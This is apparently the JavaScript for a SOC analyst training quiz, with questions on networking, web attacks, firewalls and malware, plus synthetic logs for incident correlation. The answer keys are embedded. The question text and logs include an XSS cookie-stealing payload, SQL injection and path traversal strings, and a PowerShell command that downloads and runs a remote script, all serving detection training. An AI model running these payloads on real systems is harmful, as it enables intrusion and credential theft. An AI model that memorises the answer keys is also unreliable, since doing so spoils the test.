        // Question Bank with randomization
        let totalScore = 0;
        const maxScore = 100;
        const questionScores = {};

        // Utility function to shuffle array
        function shuffle(array) {
            const newArray = [...array];
            for (let i = newArray.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [newArray[i], newArray[j]] = [newArray[j], newArray[i]];
            }
            return newArray;
        }

        // Question database
        const questionBank = {
            networking: [
                {
                    id: 'net1',
                    title: 'TCP/IP Layer Identification',
                    points: 8,
                    question: 'A user cannot access a website. You capture packets and see TCP SYN packets leaving the client but no SYN-ACK returning. At which layer should you investigate first?',
                    type: 'radio',
                    options: [
                        { value: 'application', text: 'Application Layer (DNS, HTTP)' },
                        { value: 'transport', text: 'Transport Layer (TCP handshake)' },
                        { value: 'network', text: 'Network Layer (routing, IP)' },
                        { value: 'datalink', text: 'Data Link Layer (MAC, switching)' },
                        { value: 'physical', text: 'Physical Layer (cables, signals)' }
                    ],
                    correct: 'network'
                },
                {
                    id: 'net2',
                    title: 'Protocol Analysis',
                    points: 7,
                    question: 'You observe traffic on port 3389 from multiple external IPs to your internal server 192.168.50.10. What protocol is this and why is it concerning?',
                    type: 'radio',
                    options: [
                        { value: 'rdp', text: 'RDP (Remote Desktop Protocol) - exposed to internet, brute force risk' },
                        { value: 'smb', text: 'SMB (File sharing) - lateral movement risk' },
                        { value: 'sql', text: 'MS-SQL - database exposed to internet' },
                        { value: 'ssh', text: 'SSH - Linux remote access exposed' },
                        { value: 'vnc', text: 'VNC - remote control exposed' }
                    ],
                    correct: 'rdp'
                },
                {
                    id: 'net3',
                    title: 'Packet Analysis',
                    points: 10,
                    question: 'Analyze this TCP handshake:<br><code>1. Client 10.5.20.100:51234 → Server 172.16.8.50:443 [SYN] Seq=1000<br>2. Server 172.16.8.50:443 → Client 10.5.20.100:51234 [SYN-ACK] Seq=5000 Ack=1001<br>3. Client 10.5.20.100:51234 → Server 172.16.8.50:443 [ACK] Seq=1001 Ack=?</code><br><br>What should the Ack number be in packet 3?',
                    type: 'radio',
                    options: [
                        { value: '5001', text: '5001' },
                        { value: '5000', text: '5000' },
                        { value: '1002', text: '1002' },
                        { value: '6001', text: '6001' }
                    ],
                    correct: '5001'
                }
            ],
            webattacks: [
                {
                    id: 'web1',
                    title: 'XSS Attack Detection',
                    points: 8,
                    question: 'Which of the following web application logs shows a reflected XSS attack attempt?',
                    type: 'radio',
                    options: [
                        { value: 'xss', text: 'GET /search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;' },
                        { value: 'sqli', text: "POST /login user=admin' OR 1=1--" },
                        { value: 'lfi', text: 'GET /download?file=../../../../etc/passwd' },
                        { value: 'idor', text: 'GET /api/user/profile?id=1337' }
                    ],
                    correct: 'xss'
                },
                {
                    id: 'web2',
                    title: 'Defense Mechanisms',
                    points: 12,
                    question: 'Which defenses are effective against their respective attacks? (Select ALL that apply)',
                    type: 'checkbox',
                    options: [
                        { value: 'prep_sql', text: 'Prepared statements prevent SQL injection' },
                        { value: 'csp_xss', text: 'Content Security Policy mitigates XSS' },
                        { value: 'waf_ddos', text: 'Web Application Firewall stops all DDoS attacks' },
                        { value: 'token_csrf', text: 'Anti-CSRF tokens prevent Cross-Site Request Forgery' },
                        { value: 'encode_xss', text: 'Output encoding prevents XSS' },
                        { value: 'authz_idor', text: 'Proper authorization checks prevent IDOR' }
                    ],
                    correct: ['prep_sql', 'csp_xss', 'token_csrf', 'encode_xss', 'authz_idor']
                },
                {
                    id: 'web3',
                    title: 'Path Traversal Analysis',
                    points: 10,
                    question: 'A web server receives: <code>GET /docs/../../../../windows/system32/config/sam HTTP/1.1</code><br>What is the attacker attempting?',
                    type: 'radio',
                    options: [
                        { value: 'sam', text: 'Accessing Windows password hashes (SAM file)' },
                        { value: 'config', text: 'Reading application configuration files' },
                        { value: 'upload', text: 'Uploading malicious files' },
                        { value: 'privesc', text: 'Escalating privileges in the application' }
                    ],
                    correct: 'sam'
                }
            ],
            firewall: [
                {
                    id: 'fw1',
                    title: 'Rule Analysis',
                    points: 15,
                    question: 'Review these firewall rules (processed top-to-bottom):<br><table><tr><th>#</th><th>Source</th><th>Destination</th><th>Port</th><th>Action</th></tr><tr><td>1</td><td>10.10.0.0/16</td><td>Any</td><td>Any</td><td>ALLOW</td></tr><tr><td>2</td><td>Any</td><td>192.168.100.50</td><td>80,443</td><td>ALLOW</td></tr><tr><td>3</td><td>Any</td><td>192.168.100.50</td><td>22</td><td>DENY</td></tr><tr><td>4</td><td>Any</td><td>Any</td><td>Any</td><td>DENY</td></tr></table><br>What security issues exist? (Select ALL that apply)',
                    type: 'checkbox',
                    options: [
                        { value: 'rule1_broad', text: 'Rule 1 is too permissive (allows entire 10.10.0.0/16 to anywhere)' },
                        { value: 'rule3_useless', text: 'Rule 3 is ineffective (shadowed by rule 1 for 10.10.x.x sources)' },
                        { value: 'no_logging', text: 'No logging rules specified' },
                        { value: 'ssh_exposed', text: 'SSH is completely exposed (rule 3 only blocks after rule 1 allows)' }
                    ],
                    correct: ['rule1_broad', 'rule3_useless', 'ssh_exposed']
                },
                {
                    id: 'fw2',
                    title: 'Rule Creation',
                    points: 10,
                    question: 'Create a rule to allow ONLY the IT management subnet 172.20.10.0/24 to SSH (port 22) into server 192.168.1.100. All other SSH should be blocked.',
                    type: 'textarea',
                    placeholder: 'Write your firewall rule (include: source, destination, port, action)',
                    grading: 'manual',
                    points_awarded: 10
                }
            ],
            malware: [
                {
                    id: 'mal1',
                    title: 'Persistence Mechanism Identification',
                    points: 12,
                    question: 'Which registry key is commonly abused for malware persistence on Windows startup?',
                    type: 'radio',
                    options: [
                        { value: 'run', text: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' },
                        { value: 'uninstall', text: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall' },
                        { value: 'services', text: 'HKLM\\System\\CurrentControlSet\\Services' },
                        { value: 'policies', text: 'HKLM\\Software\\Policies\\Microsoft\\Windows' }
                    ],
                    correct: 'run'
                },
                {
                    id: 'mal2',
                    title: 'Malicious Indicator Recognition',
                    points: 13,
                    question: 'An EDR alert shows:<br><code>Process: WINWORD.EXE (PID 4521)<br>Child Process: powershell.exe -WindowStyle Hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMA<br>Network: Outbound connection to 45.142.212.61:443<br>File Modified: C:\\Users\\jsmith\\AppData\\passwords.txt</code><br><br>Select ALL malicious indicators:',
                    type: 'checkbox',
                    options: [
                        { value: 'word_ps', text: 'Word spawning PowerShell (unusual parent-child relationship)' },
                        { value: 'hidden', text: 'Hidden window and encoded command (obfuscation)' },
                        { value: 'external_ip', text: 'Connection to external IP on HTTPS port (potential C2)' },
                        { value: 'sensitive_file', text: 'Modification of file named "passwords.txt"' },
                        { value: 'appdata', text: 'Activity in AppData folder' }
                    ],
                    correct: ['word_ps', 'hidden', 'external_ip', 'sensitive_file']
                }
            ],
            devices: [
                {
                    id: 'dev1',
                    title: 'Security Device Selection',
                    points: 15,
                    question: 'Match each security requirement to the BEST device:',
                    type: 'matching',
                    pairs: [
                        { id: 'pair1', label: 'Block SQL injection attacks on web application', answer: '', options: ['WAF', 'IDS', 'NGFW', 'EDR', 'SIEM', 'Email Gateway'], correct: 'WAF' },
                        { id: 'pair2', label: 'Detect lateral movement on endpoints', answer: '', options: ['WAF', 'IDS', 'NGFW', 'EDR', 'SIEM', 'Email Gateway'], correct: 'EDR' },
                        { id: 'pair3', label: 'Correlate events from 50+ log sources', answer: '', options: ['WAF', 'IDS', 'NGFW', 'EDR', 'SIEM', 'Email Gateway'], correct: 'SIEM' }
                    ]
                }
            ]
        };

        // Log Analysis Section (Realistic logs with multiple incidents)
        const logAnalysisSection = {
            id: 'logs',
            title: 'Log Analysis Practical',
            points: 30,
            description: 'You are monitoring a corporate network. Analyze ALL log sources below and identify security incidents. Multiple attack techniques are present - correlation across log types is required.',
            logs: {
                firewall: `<span class="log-timestamp">2025-01-15 08:23:11</span> <span class="log-entry">ALLOW src=<span class="log-ip">192.168.10.45</span> dst=<span class="log-ip">8.8.8.8</span> proto=<span class="log-proto">UDP</span> dport=<span class="log-port">53</span></span>
<span class="log-timestamp">2025-01-15 08:23:12</span> <span class="log-entry">ALLOW src=<span class="log-ip">192.168.10.45</span> dst=<span class="log-ip">142.250.185.78</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">443</span></span>
<span class="log-timestamp">2025-01-15 09:15:33</span> <span class="log-entry warning">DENY src=<span class="log-ip">185.220.101.18</span> dst=<span class="log-ip">192.168.50.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">9001</span></span>
<span class="log-timestamp">2025-01-15 09:15:34</span> <span class="log-entry warning">DENY src=<span class="log-ip">185.220.101.18</span> dst=<span class="log-ip">192.168.50.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">9001</span></span>
<span class="log-timestamp">2025-01-15 10:42:08</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.55</span> dst=<span class="log-ip">192.168.10.78</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">445</span></span>
<span class="log-timestamp">2025-01-15 10:42:15</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.55</span> dst=<span class="log-ip">192.168.10.79</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">445</span></span>
<span class="log-timestamp">2025-01-15 10:42:22</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.55</span> dst=<span class="log-ip">192.168.10.80</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">445</span></span>
<span class="log-timestamp">2025-01-15 11:08:41</span> <span class="log-entry critical">ALLOW src=<span class="log-ip">192.168.10.88</span> dst=<span class="log-ip">62.210.37.82</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">6667</span></span>
<span class="log-timestamp">2025-01-15 14:22:10</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">22</span></span>
<span class="log-timestamp">2025-01-15 14:22:11</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">23</span></span>
<span class="log-timestamp">2025-01-15 14:22:12</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">25</span></span>
<span class="log-timestamp">2025-01-15 14:22:13</span> <span class="log-entry warning">DENY src=<span class="log-ip">203.0.113.45</span> dst=<span class="log-ip">198.51.100.10</span> proto=<span class="log-proto">TCP</span> dport=<span class="log-port">80</span></span>`,

                webserver: `<span class="log-ip">192.168.10.45</span> - - [15/Jan/2025:08:23:15 +0000] "GET /index.html HTTP/1.1" 200 4523
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:22 +0000] "GET /products?id=5 HTTP/1.1" 200 3201
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:24 +0000] "GET /products?id=6 HTTP/1.1" 200 3198
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:26 +0000] "GET /products?id=7 HTTP/1.1" 200 3205
<span class="log-ip">203.0.113.67</span> - - [15/Jan/2025:09:18:28 +0000] "GET /products?id=8 HTTP/1.1" 403 512
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:10 +0000] "POST /login HTTP/1.1" 401 89 "user=admin&pass=admin"</span>
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:12 +0000] "POST /login HTTP/1.1" 401 89 "user=admin&pass=password123"</span>
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:14 +0000] "POST /login HTTP/1.1" 401 89 "user=admin&pass=Welcome1"</span>
<span class="log-entry critical"><span class="log-ip">198.51.100.88</span> - - [15/Jan/2025:13:45:16 +0000] "POST /login HTTP/1.1" 200 1547 "user=admin&pass=Summer2024!"</span>`,

                windows: `EventID=4624 | LogonType=3 | User=CORP\\administrator | Source=<span class="log-ip">192.168.10.55</span> | Target=WKS-078 | Time=2025-01-15 10:42:08
EventID=4624 | LogonType=3 | User=CORP\\administrator | Source=<span class="log-ip">192.168.10.55</span> | Target=WKS-079 | Time=2025-01-15 10:42:15
EventID=4624 | LogonType=3 | User=CORP\\administrator | Source=<span class="log-ip">192.168.10.55</span> | Target=WKS-080 | Time=2025-01-15 10:42:22
EventID=4688 | Process=powershell.exe | CommandLine="IEX (New-Object Net.WebClient).DownloadString('http://62.210.37.82/script')" | User=jsmith | Host=WKS-088 | Time=2025-01-15 11:08:38
EventID=4720 | NewUser=svcbackup | CreatedBy=CORP\\jsmith | Host=DC-01 | Time=2025-01-15 11:15:22`,

                dns: `<span class="log-timestamp">2025-01-15 11:32:10</span> Query from <span class="log-ip">192.168.10.122</span>: af3b8x91mq.examplecorp.com → NXDOMAIN
<span class="log-timestamp">2025-01-15 11:32:15</span> Query from <span class="log-ip">192.168.10.122</span>: k9x2n4p8zq.examplecorp.com → NXDOMAIN
<span class="log-timestamp">2025-01-15 11:32:20</span> Query from <span class="log-ip">192.168.10.122</span>: 7mq3r5t2bw.examplecorp.com → NXDOMAIN
<span class="log-timestamp">2025-01-15 11:32:25</span> Query from <span class="log-ip">192.168.10.122</span>: p8v4c1x9nk.examplecorp.com → NXDOMAIN`,

                email: `From: billing@paypa1-secure.com | To: finance@company.com | Subject: Urgent Payment Verification Required | Time: 2025-01-15 09:05:12 | Attachments: invoice_Q4_2024.pdf.exe | Status: QUARANTINED
From: ceo@company.com | To: hr@company.com | Subject: Re: Q1 Budget Planning | Time: 2025-01-15 10:15:33 | Attachments: budget_2025.xlsx | Status: DELIVERED
From: support@company-vendors.com | To: it@company.com | Subject: System Maintenance Tonight | Time: 2025-01-15 14:08:44 | Attachments: maintenance_script.vbs | Status: DELIVERED`
            },
            questions: [
                {
                    id: 'log1',
                    question: 'Identify the THREE most critical incidents:',
                    type: 'checkbox',
                    options: [
                        { value: 'brute', text: 'Brute force attack on web application login (198.51.100.88)' },
                        { value: 'lateral', text: 'SMB lateral movement across workstations (192.168.10.55)' },
                        { value: 'c2', text: 'Command & Control communication via IRC port 6667 (192.168.10.88)' },
                        { value: 'portscan', text: 'External port scan attempt (203.0.113.45)' },
                        { value: 'tor', text: 'Tor network connection attempt (185.220.101.18)' },
                        { value: 'dga', text: 'DNS tunneling or DGA malware (192.168.10.122)' },
                        { value: 'idor', text: 'IDOR vulnerability testing (203.0.113.67)' },
                        { value: 'phish', text: 'Phishing email with malicious attachment (paypa1-secure.com)' }
                    ],
                    correct: ['brute', 'lateral', 'c2'],
                    points: 15
                },
                {
                    id: 'log2',
                    question: 'What is the MITRE ATT&CK technique for the SMB lateral movement?',
                    type: 'radio',
                    options: [
                        { value: 't1021.002', text: 'T1021.002 - SMB/Windows Admin Shares' },
                        { value: 't1110', text: 'T1110 - Brute Force' },
                        { value: 't1071', text: 'T1071 - Application Layer Protocol' },
                        { value: 't1547', text: 'T1547 - Boot or Logon Autostart Execution' }
                    ],
                    correct: 't1021.002',
                    points: 8
                },
                {
                    id: 'log3',
                    question: 'Based on the Windows Event log, what suspicious action occurred on the domain controller DC-01?',
                    type: 'radio',
                    options: [
                        { value: 'newuser', text: 'New user account "svcbackup" created by compromised user' },
                        { value: 'passchange', text: 'Administrator password was changed' },
                        { value: 'logoff', text: 'Suspicious logoff event' },
                        { value: 'deletion', text: 'User account was deleted' }
                    ],
                    correct: 'newuser',
                    points: 7
                }
            ]
        };

        // Render all questions
        function renderQuiz() {
            const content = document.getElementById('quiz-content');
            let html = '';

            // Networking Section
            html += `<div class="section">
                <h2>Section 1: Network Fundamentals & Protocols (25 points)</h2>`;
            questionBank.networking.forEach(q => {
                html += renderQuestion(q);
            });
            html += `</div>`;

            // Web Attacks Section
            html += `<div class="section">
                <h2>Section 2: Web Application Security (30 points)</h2>`;
            questionBank.webattacks.forEach(q => {
                html += renderQuestion(q);
            });
            html += `</div>`;

            // Firewall Section
            html += `<div class="section">
                <h2>Section 3: Firewall Rules & Network Security (25 points)</h2>`;
            questionBank.firewall.forEach(q => {
                html += renderQuestion(q);
            });
            html += `</div>`;

            // Malware Section
            html += `<div class="section">
                <h2>Section 4: Malware Analysis & Threat Detection (25 points)</h2>`;
            questionBank.malware.forEach(q => {
                html += renderQuestion(q);
            });
            html += `</div>`;

            // Devices Section
            html += `<div class="section">
                <h2>Section 5: Security Infrastructure (15 points)</h2>`;
            questionBank.devices.forEach(q => {
                html += renderQuestion(q);
            });
            html += `</div>`;

            // Log Analysis Section
            html += renderLogAnalysis();

            content.innerHTML = html;
        }

        function renderQuestion(q) {
            let html = `<div class="question-block">
                <div class="question-title">${q.title} (${q.points} points)</div>
                <div class="question-text">${q.question}</div>`;

            if (q.type === 'radio') {
                const shuffledOptions = shuffle(q.options);
                shuffledOptions.forEach(opt => {
                    html += `<label class="answer-option">
                        <input type="radio" name="${q.id}" value="${opt.value}">
                        ${opt.text}
                    </label>`;
                });
            } else if (q.type === 'checkbox') {
                const shuffledOptions = shuffle(q.options);
                shuffledOptions.forEach(opt => {
                    html += `<label class="answer-option">
                        <input type="checkbox" name="${q.id}" value="${opt.value}">
                        ${opt.text}
                    </label>`;
                });
            } else if (q.type === 'textarea') {
                html += `<textarea id="${q.id}" placeholder="${q.placeholder}"></textarea>`;
            } else if (q.type === 'matching') {
                q.pairs.forEach(pair => {
                    html += `<div style="margin: 1rem 0;">
                        <label class="input-label">${pair.label}</label>
                        <select class="dropdown-select" id="${pair.id}">
                            <option value="">Select device...</option>`;
                    pair.options.forEach(opt => {
                        html += `<option value="${opt}">${opt}</option>`;
                    });
                    html += `</select></div>`;
                });
            }

            html += `<button class="check-answer-btn" onclick="checkAnswer('${q.id}')">Check Answer</button>
                <div id="feedback-${q.id}"></div>
            </div>`;

            return html;
        }

        function renderLogAnalysis() {
            let html = `<div class="section">
                <h2>Section 6: ${logAnalysisSection.title} (${logAnalysisSection.points} points)</h2>
                <p style="background: rgba(245, 158, 11, 0.1); padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--warning);">
                    ${logAnalysisSection.description}
                </p>

                <div class="question-block">
                    <div class="question-title">Firewall Logs</div>
                    <div class="code-block">${logAnalysisSection.logs.firewall}</div>
                </div>

                <div class="question-block">
                    <div class="question-title">Web Server Access Logs</div>
                    <div class="code-block">${logAnalysisSection.logs.webserver}</div>
                </div>

                <div class="question-block">
                    <div class="question-title">Windows Security Event Logs</div>
                    <div class="code-block">${logAnalysisSection.logs.windows}</div>
                </div>

                <div class="question-block">
                    <div class="question-title">DNS Query Logs</div>
                    <div class="code-block">${logAnalysisSection.logs.dns}</div>
                </div>

                <div class="question-block">
                    <div class="question-title">Email Gateway Logs</div>
                    <div class="code-block">${logAnalysisSection.logs.email}</div>
                </div>`;

            logAnalysisSection.questions.forEach(q => {
                html += `<div class="question-block">
                    <div class="question-title">${q.question} (${q.points} points)</div>`;

                if (q.type === 'checkbox') {
                    const shuffledOptions = shuffle(q.options);
                    shuffledOptions.forEach(opt => {
                        html += `<label class="answer-option">
                            <input type="checkbox" name="${q.id}" value="${opt.value}">
                            ${opt.text}
                        </label>`;
                    });
                } else if (q.type === 'radio') {
                    const shuffledOptions = shuffle(q.options);
                    shuffledOptions.forEach(opt => {
                        html += `<label class="answer-option">
                            <input type="radio" name="${q.id}" value="${opt.value}">
                            ${opt.text}
                        </label>`;
                    });
                }

                html += `<button class="check-answer-btn" onclick="checkAnswer('${q.id}')">Check Answer</button>
                    <div id="feedback-${q.id}"></div>
                </div>`;
            });

            html += `</div>`;
            return html;
        }

        function checkAnswer(qid) {
            let question = findQuestion(qid);
            if (!question) return;

            let userAnswer, isCorrect = false, points = 0;
            let feedback = '';

            if (question.type === 'radio') {
                userAnswer = document.querySelector(`input[name="${qid}"]:checked`)?.value;
                isCorrect = userAnswer === question.correct;
                points = isCorrect ? question.points : 0;
                feedback = isCorrect ?
                    `Correct! You earned ${points} points.` :
                    `Incorrect. The correct answer relates to ${question.correct}.`;
            } else if (question.type === 'checkbox') {
                userAnswer = Array.from(document.querySelectorAll(`input[name="${qid}"]:checked`)).map(cb => cb.value);
                const correctSet = new Set(question.correct);
                const userSet = new Set(userAnswer);

                const correctSelections = userAnswer.filter(ans => correctSet.has(ans)).length;
                const incorrectSelections = userAnswer.filter(ans => !correctSet.has(ans)).length;
                const missedCorrect = question.correct.length - correctSelections;

                if (correctSelections === question.correct.length && incorrectSelections === 0) {
                    isCorrect = true;
                    points = question.points;
                    feedback = `Perfect! You earned ${points} points.`;
                } else {
                    points = Math.max(0, Math.round((correctSelections / question.correct.length) * question.points) - incorrectSelections);
                    feedback = `Partial credit: ${points}/${question.points} points. Correct: ${correctSelections}, Incorrect: ${incorrectSelections}, Missed: ${missedCorrect}`;
                }
            } else if (question.type === 'matching') {
                let correct = 0;
                question.pairs.forEach(pair => {
                    const answer = document.getElementById(pair.id).value;
                    if (answer === pair.correct) correct++;
                });
                points = Math.round((correct / question.pairs.length) * question.points);
                isCorrect = correct === question.pairs.length;
                feedback = isCorrect ?
                    `Perfect matching! You earned ${points} points.` :
                    `Partial credit: ${correct}/${question.pairs.length} correct. Points: ${points}/${question.points}`;
            } else if (question.type === 'textarea') {
                points = question.points_awarded;
                feedback = `Manual grading required. Potential: ${points} points.`;
            }

            updateQuestionScore(qid, points);
            displayFeedback(qid, feedback, isCorrect ? 'correct' : (points > 0 ? 'partial' : 'incorrect'));
        }

        function findQuestion(qid) {
            for (let category in questionBank) {
                const q = questionBank[category].find(q => q.id === qid);
                if (q) return q;
            }
            const logQ = logAnalysisSection.questions.find(q => q.id === qid);
            return logQ || null;
        }

        function updateQuestionScore(qid, points) {
            const previousPoints = questionScores[qid] || 0;
            questionScores[qid] = points;
            totalScore = totalScore - previousPoints + points;

            document.getElementById('current-score').textContent = totalScore;
            document.getElementById('progress-fill').style.width = `${(totalScore / maxScore) * 100}%`;
        }

        function displayFeedback(qid, message, type) {
            const feedbackDiv = document.getElementById(`feedback-${qid}`);
            feedbackDiv.className = `feedback ${type}`;
            feedbackDiv.innerHTML = message;
        }

        function showFinalScore() {
            const percentage = (totalScore / maxScore) * 100;
            let grade, message;

            if (percentage >= 90) {
                grade = 'Excellent';
                message = 'Outstanding performance! You demonstrate strong SOC analyst skills.';
            } else if (percentage >= 80) {
                grade = 'Very Good';
                message = 'Great work! You have a solid understanding of SOC operations.';
            } else if (percentage >= 70) {
                grade = 'Pass';
                message = 'You passed! Continue studying to strengthen your skills.';
            } else {
                grade = 'Needs Improvement';
                message = 'Keep studying. Review network protocols, log analysis, and MITRE ATT&CK framework.';
            }

            alert(`FINAL ASSESSMENT RESULTS\n\nScore: ${totalScore} / ${maxScore} (${percentage.toFixed(1)}%)\nGrade: ${grade}\n\n${message}`);
        }

        // Initialize quiz on load
        window.onload = renderQuiz;
    </script>
